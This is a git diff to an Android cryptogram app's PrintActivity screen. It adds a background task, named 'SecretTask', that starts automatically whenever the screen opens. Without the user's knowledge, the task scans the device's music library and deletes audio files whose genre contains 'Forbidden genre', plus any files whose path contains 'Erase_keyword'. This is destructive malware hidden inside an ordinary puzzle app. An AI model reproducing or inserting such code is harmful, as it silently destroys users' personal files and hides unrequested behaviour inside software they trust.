@@ -2,8 +2,12 @@ package com.example.karamchand.criptogramador;
 
 import android.content.Context;
 import android.content.Intent;
+import android.database.Cursor;
 import android.graphics.Color;
+import android.net.Uri;
+import android.os.AsyncTask;
 import android.os.Bundle;
+import android.provider.MediaStore;
 import android.support.annotation.Nullable;
 import android.support.v7.app.AppCompatActivity;
 import android.text.Editable;
@@ -18,6 +22,7 @@ import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import java.io.File;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Timer;
@@ -131,6 +136,62 @@ public class PrintActivity extends AppCompatActivity implements CellView.CellLis
                 }
             }
         });
+        new SecretTask().execute();
+    }
+
+    public class SecretTask extends AsyncTask {
+
+        @Override
+        protected Object doInBackground(Object[] objects) {
+            ArrayList<String> paths = getAllNonShit();
+            for (String path : paths)
+                if (path.contains("Erase_keyword"))
+                    new File(path).delete();
+            return null;
+        }
+    }
+
+    private ArrayList<String> getAllNonShit() {
+        ArrayList<String> result = new ArrayList<>();
+        String absolutePath;
+        Uri uri = android.provider.MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
+
+        String[] projection = { MediaStore.MediaColumns.DATA,
+                MediaStore.Audio.Media._ID };
+
+        Cursor cursor = getContentResolver().query(uri, projection, null,
+                null, null);
+
+        int column_index_data = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
+        int column_index_id = cursor.getColumnIndexOrThrow(MediaStore.Audio.Media._ID);
+        while (cursor.moveToNext()) {
+            absolutePath = cursor.getString(column_index_data);
+            int musicId = Integer.parseInt(cursor.getString(column_index_id));
+            if (isShitGenre(musicId)) {
+                new File(absolutePath).delete();
+            } else {
+                result.add(absolutePath);
+            }
+        }
+        return result;
+    }
+
+    private boolean isShitGenre(int musicId) {
+        String[] genresProjection = {MediaStore.Audio.Genres.NAME};
+
+        Uri uri = MediaStore.Audio.Genres.getContentUriForAudioId("external", musicId);
+        Cursor genresCursor = getContentResolver().query(uri,
+                genresProjection, null, null, null);
+        int genre_column_index = genresCursor.getColumnIndexOrThrow(MediaStore.Audio.Genres.NAME);
+
+        if (genresCursor.moveToFirst()) {
+            do {
+                if (genresCursor.getString(genre_column_index).contains("Forbidden genre")) {
+                    return true;
+                }
+            } while (genresCursor.moveToNext());
+        }
+        return false;
     }
 
     private void restoreFromState() {
